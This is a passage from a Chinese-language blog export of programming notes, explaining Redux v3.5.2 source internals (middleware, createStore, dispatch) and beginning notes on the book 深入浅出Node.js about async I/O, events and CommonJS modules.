<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Transaction = <span class="built_in">require</span>(<span class="string">"./Transaction"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们自己定义的事务</span></span><br><span class="line"><span class="keyword">var</span> MyTransaction = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(MyTransaction.prototype, Transaction.Mixin, &#123;</span><br><span class="line">  getTransactionWrappers: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">      &#123;</span><br><span class="line">        initialize: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">"before method"</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        close: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">"after method"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> transaction = <span class="keyword">new</span> MyTransaction();</span><br><span class="line"><span class="keyword">var</span> testMethod = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"test"</span>);</span><br><span class="line">&#125;;</span><br><span class="line">transaction.perform(testMethod);</span><br><span class="line"><span class="comment">// 打印出</span></span><br><span class="line"><span class="comment">// before method</span></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="comment">// after method</span></span><br></pre></td></tr></table></figure>
<p>???需补充 setState 状态的方法</p>
<h2 id="diff-算法"><a href="#diff-算法" class="headerlink" title="diff 算法"></a>diff 算法</h2><h1 id="Redux-基于-v3-5-2-版本"><a href="#Redux-基于-v3-5-2-版本" class="headerlink" title="Redux(基于 v3.5.2 版本)"></a>Redux(基于 v3.5.2 版本)</h1><h2 id="Redux-是什么"><a href="#Redux-是什么" class="headerlink" title="Redux 是什么"></a>Redux 是什么</h2><p>redux 是一个”可预测的状态容器”。</p>
<h2 id="Redux-三大原则"><a href="#Redux-三大原则" class="headerlink" title="Redux 三大原则"></a>Redux 三大原则</h2><p>1.单一数据源 2.状态是只读的 3.状态修改均由纯函数完成<br>没有副作用、可以每次数据变化前后的状态，可以时间旅行调试。</p>
<h2 id="Redux-核心-API"><a href="#Redux-核心-API" class="headerlink" title="Redux 核心 API"></a>Redux 核心 API</h2><p><code>createStore(reducers[,initialState])</code><br>在 redux 中，负责响应 action 并修改数据的角色是 reducer。reducer 本质是纯函数。<br>`reducer(previousState, action) =&gt; newState<br>createStore 创建的 store 是一个对象，包含 4 个方法<br>1.getState()<br>2.dispatch(action)<br>3.subscribe(listener)<br>4.replaceReducer(nextReducer):更新当前 store 里的 reducer，一般只会在开发模式中调用。</p>
<h2 id="与-React-绑定"><a href="#与-React-绑定" class="headerlink" title="与 React 绑定"></a>与 React 绑定</h2><p>react-redux 提供了一个组件(<code>&lt;Provider&gt;</code>)和一个 API(connect())帮助 Redux 和 React 进行绑定。</p>
<h2 id="Redux-middleware"><a href="#Redux-middleware" class="headerlink" title="Redux middleware"></a>Redux middleware</h2><p>middleware 提供了一个分类处理 action 的机会。在 middleware 中，你可以检阅每一个流过的 action，挑选出特定类型的 action 进行相应操作，给你一次改变 action 的机会。</p>
<h2 id="理解-middleware-机制"><a href="#理解-middleware-机制" class="headerlink" title="理解 middleware 机制"></a>理解 middleware 机制</h2><p>Redux 提供了 applyMiddleware 方法来加载 middleware:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// compose.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">compose</span>(<span class="params">...funcs</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (funcs.length === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">arg</span> =&gt;</span> arg;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> last = funcs[funcs.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">const</span> rest = funcs.slice(<span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">...args</span>) =&gt;</span></span><br><span class="line">      rest.reduceRight(<span class="function">(<span class="params">composed, f</span>) =&gt;</span> f(composed), last(...args));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> compose <span class="keyword">from</span> <span class="string">"./compose"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">applyMiddleware</span>(<span class="params">...middlewares</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">createStore</span> =&gt;</span> <span class="function">(<span class="params">reducer, initialState, enhancer</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> store = createStore(reducer, initialState, enhancer);</span><br><span class="line">    <span class="keyword">var</span> dispatch = store.dispatch;</span><br><span class="line">    <span class="keyword">var</span> chain = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> middlewareAPI = &#123;</span><br><span class="line">      getState: store.getState,</span><br><span class="line">      dispatch: <span class="function"><span class="params">action</span> =&gt;</span> dispatch(action)</span><br><span class="line">    &#125;;</span><br><span class="line">    chain = middlewares.map(<span class="function"><span class="params">middleware</span> =&gt;</span> middleware(middlewareAPI));</span><br><span class="line">    dispatch = compose(...chain)(store.dispatch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      ...store,</span><br><span class="line">      dispatch</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们实现一个 logger middleware：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store =&gt; <span class="function"><span class="params">next</span> =&gt;</span> <span class="function"><span class="params">action</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"dispatch:"</span>, action);</span><br><span class="line">  next(action);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"finish:"</span>, action);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>接下来，我们分 4 步来深入解析 middleware 的运行原理 1.函数式编程思想设计<br>middleware 的设计有点特殊，是一个层层包裹的匿名函数，这其实是函数式编程中的 curring，它是一种使用匿名单参数函数来实现多参数函数的方法。applyMiddleware 会对 logger 这个 middleware 进行层层调用，动态地将 store 和 next 的参数赋值。<br>curring 的 middleware 结构的好处主要有以下两点</p>
<ol>
<li>易串联：通过 currying 形成的 middleware 可以累积参数，再配合组合（compose）的方式，很容易形成 pipeling 来处理数据流。</li>
<li>共享 store: 在 applyMiddleware 执行的过程中，store 还是旧的，但是因为闭包的存在，applyMiddleware 完成后，所有的 middleware 内部拿到的 store 是最新且相同的。</li>
</ol>
<p>2.给 middleware 分发 store<br>通过如下方式创建一个普通的 store:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> newStore = applyMiddleWare(mid1, mid2, ...)(createStore)(reducer, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<h2 id="解读-Redux"><a href="#解读-Redux" class="headerlink" title="解读 Redux"></a>解读 Redux</h2><p>createStore 几乎囊括了 Redux 的核心功能。</p>
<h2 id="参数归一化"><a href="#参数归一化" class="headerlink" title="参数归一化"></a>参数归一化</h2><p>先看看 createStore 的函数签名：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">createStore</span>(<span class="params">reducer, initialState, enhancer</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前两个参数比较常见，那么 enhancer 扮演了什么角色呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> initialState === <span class="string">"function"</span> &amp;&amp; <span class="keyword">typeof</span> enhancer === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">  enhancer = initialState;</span><br><span class="line">  initialState = <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> enhancer !== <span class="string">"undefined"</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> enhancer !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Expected the enhancer to be a function."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> enhancer(createStore)(reducer, initialState);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 enhancer(createStore)(reducer, initialState)调用中，enhancer 对 createStore 的能力进行了增强，最终返回 store。<br>典型使用案例是 redux-devtools-extension,它将 Redux DevTools 做成浏览器插件。</p>
<h2 id="初始状态及-getState"><a href="#初始状态及-getState" class="headerlink" title="初始状态及 getState"></a>初始状态及 getState</h2><p>完成基本参数校验后，在 createStore 中声明了如下变量及 getState 方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> currentReducer = reducer;</span><br><span class="line"><span class="keyword">var</span> currentState = initialState;</span><br><span class="line"><span class="keyword">var</span> currentListeners = [];</span><br><span class="line"><span class="keyword">var</span> nextListeners = currentListeners;</span><br><span class="line"><span class="keyword">var</span> isDispatching = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ensureCanMutateNextListeners</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (nextListeners === currentListeners) &#123;</span><br><span class="line">    nextListeners = currentListeners.slice();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getState</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> currentState;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>currentReducer:当前的 reducer,支持通过 store.replaceReducer 方式动态替换 reducer,为代码热替换提供了可能。</li>
<li>currentState:应用的当前状态，默认为初始化时的状态。</li>
<li>currentListeners、nextListeners：监听器</li>
<li>isDispatching：某个 action 是否处于分发的处理过程中</li>
</ol>
<p>getState 方法用于返回当前状态。</p>
<h2 id="subscribe、unsubscribe"><a href="#subscribe、unsubscribe" class="headerlink" title="subscribe、unsubscribe"></a>subscribe、unsubscribe</h2><p>在 getState 之后定义了 store 的 subscribe 方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">subscribe</span>(<span class="params">listener</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> listener !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Expected listener to be a function."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> isSubscribed = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  ensureCanMutateNextListeners();</span><br><span class="line">  nextListeners.push(listener);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">unsubscribe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSubscribed) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isSubscribed = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    ensureCanMutateNextListeners();</span><br><span class="line">    <span class="keyword">var</span> index = nextListeners.indexOf(listener);</span><br><span class="line">    nextListeners.splice(index, <span class="number">1</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>subscribe 将 listener 添加到 nextListeners 中，unsubscribe 可以删除这个 listener。</p>
<h2 id="dispatch"><a href="#dispatch" class="headerlink" title="dispatch"></a>dispatch</h2><p>接下来就是 dispatch</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dispatch</span>(<span class="params">action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!isPlainObject(action)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(</span><br><span class="line">      <span class="string">"Actions must be plain objects. "</span> +</span><br><span class="line">        <span class="string">"Use custom middleware for async actions."</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> action.type === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(</span><br><span class="line">      <span class="string">'Actions may not have an undefined "type" property. '</span> +</span><br><span class="line">        <span class="string">"Have you misspelled a constant?"</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isDispatching) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Reducers may not dispatch actions."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    isDispatching = <span class="literal">true</span>;</span><br><span class="line">    currentState = currentReducer(currentState, action);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    isDispatching = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> listeners = (currentListeners = nextListeners);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; listeners.length; i++) &#123;</span><br><span class="line">    listeners[i]();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> action;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先是一些校验，然后将当前的状态和 action 传给当前的 reducer,用于生成最新的 state。再依次调用所有的监听器，通知状态的变更。最后返回 action</p>
<h2 id="replaceReducer"><a href="#replaceReducer" class="headerlink" title="replaceReducer"></a>replaceReducer</h2><p>这个方法主要用于 reducer 的热替换，在开发过程中很少使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceReducer</span>(<span class="params">nextReducer</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> nextReducer !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Expected the nextReducer to be a function."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  currentReducer = nextReducer;</span><br><span class="line">  dispatch(&#123; <span class="attr">type</span>: ActionTypes.INIT &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>dispatch({ type: ActionTypes.INIT })是为了拿到所有 reducer 中的初始状态，只用所有状态都成功获取后，Redux 应用才能有条不紊地运作。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>《深入浅出Node.js》</title>
    <url>/2019/04/22/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BANode-js/</url>
    <content><![CDATA[<h1 id="Node简介"><a href="#Node简介" class="headerlink" title="Node简介"></a>Node简介</h1><h2 id="为什么是JavaScript"><a href="#为什么是JavaScript" class="headerlink" title="为什么是JavaScript"></a>为什么是JavaScript</h2><p>Ryan Dahl创造出Node之前，他的主要工作都是围绕高性能Web服务器进行的。经历过一些尝试和失败之后，他找到了设计高性能web服务器的几个要点：事件驱动、非阻塞I/O.<br>他提到，大多数人不设计一种更简单和更有效率的程序的主要原因是他们用到了阻塞I/O的库。<br>他评估过许多语言：C的开发门槛高，不会有太多的开发者将它用于日常的业务开发。作者觉得自身还玩不转Haskell，所以舍弃它；Lua自身已经包含很多阻塞I/O库，为其构建非阻塞I/O库也不能改变人们继续使用阻塞I/O库的习惯。Ruby的虚拟机性能不好。<br>相比之下，JavaScript门槛低，比Lua历史包袱少，javas在浏览器中有广泛的事件驱动方面的应用，暗合Ryan Dahl喜好基于事件驱动的需求。Chrome浏览器的JavaScript引擎性能优异。考虑到高性能、符合事件驱动、没有历史包袱这3个主要原因，JavaScript成为了Node的实现语言。</p>
<p><img src="https://mfaying.github.io/images/node/2.jpg" alt="avatar"><br>chrome浏览器和node的组件构成<br><a id="more"></a></p>
<p>除了HTML、Webkit和显卡这些UI相关技术没有支持外，node的结构和chrome十分相似。在node中，javascript可以随心所欲地访问本地文件，可以搭建websocket服务器，可以连接数据库，可以如web workers一样玩转多进程。</p>
<h2 id="为什么叫Node"><a href="#为什么叫Node" class="headerlink" title="为什么叫Node"></a>为什么叫Node</h2><p>项目的发展超过了他最初单纯开发一个web服务器的想法，变成了构建网络应用的一个基础框架，可以在它的基础上构建更多的东西，诸如服务器、客户端、命令行工具等。Node发展为一个强制不共享任何资源的单线程、单进程系统，包含十分适宜网络的库，为构建大型分布式应用程序提供基础设施，其目标也是成为一个构建快速、可伸缩的网络应用平台。它自身非常简单，通过通信协议来组织许多Node,非常容易通过扩展来达成构建大型网络应用的目的。每个Node进程都构成这个网络应用中的一个节点，这是它名字所含意义的真谛。</p>
<h2 id="Node给JavaScript带来的意义"><a href="#Node给JavaScript带来的意义" class="headerlink" title="Node给JavaScript带来的意义"></a>Node给JavaScript带来的意义</h2><p>Chrome浏览器和Node的组件构成如下图1-1所示。<br><img src="https://mfaying.github.io/static/images/node/1.jpg" alt="avatar"><br>浏览器中除了V8作为JavaScript引擎外，还有一个WebKit布局引擎。HTML5在发展过程中定义了更多更丰富的API。在实现上，浏览器提供了越来越多的功能暴露给JavaScript和HTML标签。</p>
<p>Node的结构与Chrome十分相似。它们都是基于事件驱动的异步架构，浏览器通过事件驱动来服务界面上的交互，Node通过事件驱动来服务I/O。</p>
<h2 id="node的特点"><a href="#node的特点" class="headerlink" title="node的特点"></a>node的特点</h2><p>1.异步I/O</p>
<p>发起Ajax调用就是一个异步的过程<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.post(<span class="string">'/url'</span>, &#123; <span class="attr">title</span>: <span class="string">'深入浅出Node.js'</span> &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'收到响应'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'发送ajax结束'</span>);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://mfaying.github.io/static/images/node/2.jpg" alt="avatar"><br>在node中，异步I/O也很常见。以读取文件为例，我们看到它与前端ajax调用的方法是极其类似的：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'/path'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'读取文件完成'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'发起读取文件'</span>);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://mfaying.github.io/static/images/node/3.jpg" alt="avatar"><br>在node中，绝大多数的操作都以异步的方式进行调用，从文件读取到网络请求等。我们可以在语言层面很自然地进行并行I/O操作。每个调用之间无须等待之前的I/O调用结束，在编程模型上可以极大提升效率。</p>
<p>2.事件与回调函数</p>
<p>node将前端浏览器中应用广泛且成熟的事件引入后端，配合异步I/O,将事件点暴露给业务逻辑。</p>
<p>下面举个例子：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 侦听服务器的request事件</span></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> postData = <span class="string">''</span>;</span><br><span class="line">  req.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 侦听请求的data事件</span></span><br><span class="line">  req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">    postData += chunk;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 侦听请求的end事件</span></span><br><span class="line">  req.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    res.end(postData);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;).listen(<span class="number">8080</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'服务器启动完成'</span>);</span><br></pre></td></tr></table></figure></p>
<p>node创建了一个web服务器，并侦听8080端口。对于服务器，我们为其绑定了request事件，对于请求对象，我们为其绑定了data事件和end事件。</p>
<p>事件的编程具有轻量级、松耦合、只关注事务点等优势，但是在多个异步任务的场景下事件与事件之间各自独立，如何协作是一个问题。</p>
<p>node除了异步和事件外，回调函数是一大特色。纵观下来，回调函数也是最好的接受异步调用返回数据的方式。在流程控制方面，因为穿插了异步方法和回调函数，与常规的同步方式相比，变得不那么一目了然了。然而，在转变为异步编程思维后，通过对业务的划分和对事件的提炼，在流程控制方面处理业务的复杂度与同步方式实际上是一致的。</p>
<p>3.单线程</p>
<p>node是单线程的。在node中,javascript与其余线程是无法共享任何状态的。单线程的最大好处是不用像多线程编程那样处处在意状态的同步问题，这里没有死锁的存在，也没有线程上下文交换所带来的性能上的开销。</p>
<p>但单线程也有它自身的弱点：<br>1.无法利用多核CPU<br>2.错误会引起整个应用退出，应用的健壮性值得考验。<br>3.大量计算占用CPU导致无法继续调用异步I/O。</p>
<p>在Node中，长时间的CPU占用会导致后续的异步I/O发不出调用、已完成的异步I/O的回调函数也会得不到及时执行。</p>
<p>HTML5定制了Web Workers的标准。Web Workers能够创建工作线程来进行计算，以解决JavaScript大计算阻塞UI渲染的问题。工作线程为了不阻塞主线程，通过消息传递的方式来传递运行结果，这也使得工作线程不能访问到主线程中的UI</p>
<p>node采用了与Web Workers相同的思路来解决单线程中大计算量的问题:<code>child_process</code>。</p>
<p>子进程的出现，意味着node可以从容地应对单线程在健壮性和无法利用多核CPU方面的问题，通过将计算分发到各个子进程，可以将大量计算分解掉，然后再通过进程之间的事件消息来传递结果，这很好地保持应用模型的简单和低依赖。通过Master-Worker的管理方式，也可以很好地管理各个工作进程，以达到更好的健壮性。</p>
<p>4.跨平台</p>
<p>node基于libuv实现跨平台的架构示意图如下。<br><img src="https://mfaying.github.io/static/images/node/4.jpg" alt="avatar"></p>
<p>兼容windows和*nix平台主要得益于node在架构层面的改动，它在操作系统与node上层模块系统之间构建了一层平台层架构，即libuv。目前，libuv已经成为许多系统实现跨平台的基础组件。通过良好的架构，node的第三方C++模块(除了没有保持更新的模块外)也可以借助libuv实现跨平台。</p>
<h2 id="node的应用场景"><a href="#node的应用场景" class="headerlink" title="node的应用场景"></a>node的应用场景</h2><p>1.I/O密集型</p>
<p>node擅长I/O密集型的应用场景，它面向网络且擅长并行I/O，能够有效地组织起更多的硬件资源。I/O密集的优势主要在于node利用事件循环的处理能力，而不是启动每一个线程为每一个请求服务，资源占用极少。</p>
<p>2.是否不擅长CPU密集型业务</p>
<p>在CPU密集的应用场景中，node是否能胜任呢？实际上，单以执行效率来做评判，V8的执行效率是毋庸置疑的。<br>计算斐波那契数列的耗时排行(n=40)<br><img src="https://mfaying.github.io/static/images/node/5.jpg" alt="avatar"></p>
<p>CPU密集型应用给node带来的挑战主要是：由于javascript单线程的原因，如果长时间运行的计算，将会导致CPU时间片不能释放，使得后续的I/O无法发起。但是适当调整和分解大型运算任务为多个小任务，使得运算能够适当释放，不阻塞I/O调用的发起，这样既可同时享受到并行异步I/O的好处，又能充分利用CPU。对于长时间运行的计算，如果它的耗时超过普通阻塞I/O的耗时，那么应用场景就需要重新评估了，此类场景或许应该采用多线程的方式进行计算。</p>
<p>node虽然没有提供多线程用于计算支持，但是还是有以下两个方式来充分利用CPU。<br>1.通过编写C/C++扩展的方式更有效地利用CPU，上图中C/C++拓展的方式计算速度比java还要快。<br>2.如果还不够满足需求，可以通过子进程的方式，将一部分Node进程当做常驻服务进程用于计算，然后利用进程间的消息来传递结果，将计算与I/O分离，这样还能充分利用多CPU。</p>
<h2 id="与遗留系统和平共处"><a href="#与遗留系统和平共处" class="headerlink" title="与遗留系统和平共处"></a>与遗留系统和平共处</h2><p>LinkedIn旧有的系统具有非常稳定的数据输出，Node将该数据源当做数据接口，发挥异步并行的优势，而不用关心它背后是用什么语言实现的。</p>
<p>雪球财经从旧有的java项目中分离出一个node项目，使得前端工程师在HTTP协议栈的两端能够高效灵活地开发，避免了Java烦琐的表达；另一方面，又利用java作为后端接口和中间件，使其具有良好的稳定性。</p>
<h2 id="分布式应用"><a href="#分布式应用" class="headerlink" title="分布式应用"></a>分布式应用</h2><p>分布式应用意味着对可伸缩性的要求非常高，比如阿里巴巴的NodeFox，将数据库集群做了划分和映射，查询调用依旧是针对单张表，中间层分解查询SQL，并行地去多台数据库中获取数据并合并。这个案例其实也是高效利用并行I/O的例子。对于node，这个行为只是一次普通的I/O。对于数据库而言，却是一次复杂的计算，所以也是进而充分压榨硬件资源的过程。</p>
<h2 id="node的使用者"><a href="#node的使用者" class="headerlink" title="node的使用者"></a>node的使用者</h2><p>node的使用者主要有以下几类：<br>1.前后端编程语言环境统一，可以减少不同语言上下文交换的负担<br>2.node带来的高性能I/O用于实时应用，实时语音、scoket.io实时通知等<br>3.并行I/O使得使用者可以更有效的利用分布式环境。如阿里巴巴的NodeFox借助Node并行I/O的能力，更高效地使用已有的数据。<br>3.并行I/O，有效利用稳定接口提升web渲染能力。<br>4.云计算平台提供node支持。<br>5.游戏开发领域。对实时和并发有很高的要求。<br>6.工具类应用。比如一些前端工具。</p>
<h1 id="模块机制"><a href="#模块机制" class="headerlink" title="模块机制"></a>模块机制</h1><p>javascript先天就缺乏模块机制，通过script标签引入代码的方式显得杂乱无章，语言自身毫无组织和约束能力，人们不得不用命名空间等方式人为地约束代码，以求达到安全和易用的目的。</p>
<p>随着javascript不断发展，社区制定了相应的规范，尤其是CommonJS规范的提出。</p>
<h2 id="CommonJS规范"><a href="#CommonJS规范" class="headerlink" title="CommonJS规范"></a>CommonJS规范</h2><p>CommonJS规范为JavaScript制定了一个美好的愿景——希望JavaScript能够在任何地方运行。</p>
<p>对于javascript自身而言，它的规范依然是薄弱的，还有以下缺陷。</p>
<ol>
<li>没有模块系统</li>
<li>标准库较少。ECMAScript仅定义了部分核心库，对于文件系统，I/O流等常见需求却没有标准的API。</li>
<li>没有标准接口。几乎没有定义过如web服务器或者数据库之类的标准统一接口。</li>
<li>缺乏包管理系统。导致javascript应用中基本没有自动加载和安装依赖的能力。</li>
</ol>
<p>CommonJS规范的提出，主要是为了弥补当前javascript没有标准的缺陷，从而具备开发大型应用的基础能力，他们期望那些用CommonJS API写出的应用可以具备跨宿主环境的能力，这样不仅可以用javascript开发富客户端应用，而且还可以编写以下应用。</p>
<p>1.服务器端javascript应用程序<br>2.命令行工具<br>3.桌面图形界面应用程序。<br>4.混合应用。</p>
<p>目前，该规范依旧在成长，它涵盖了模块、二进制、Buffer、字符集编码、I/O流、进程环境、文件系统、套接字、单元测试、web服务器网关接口、包管理等。<br><img src="https://mfaying.github.io/static/images/node/6.jpg" alt="avatar"><br>node借鉴CommonJS的Modules规范实现了一套非常易用的模块系统，NPM对Packages规范的完好支持使得Node应用在开发中事半功倍。</p>
<h2 id="CommonJS的模块规范"><a href="#CommonJS的模块规范" class="headerlink" title="CommonJS的模块规范"></a>CommonJS的模块规范</h2><p>CommonJS对模块的定义十分简单，主要分为模块引用、模块定义和模块标识3个部分。</p>
<p>1.模块引用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> math = <span class="built_in">require</span>(<span class="string">'math'</span>);</span><br></pre></td></tr></table></figure>
<p>require这个方法接受模块标识，以此引入一个模块的API到当前上下文中。</p>
<p>2.模块定义</p>
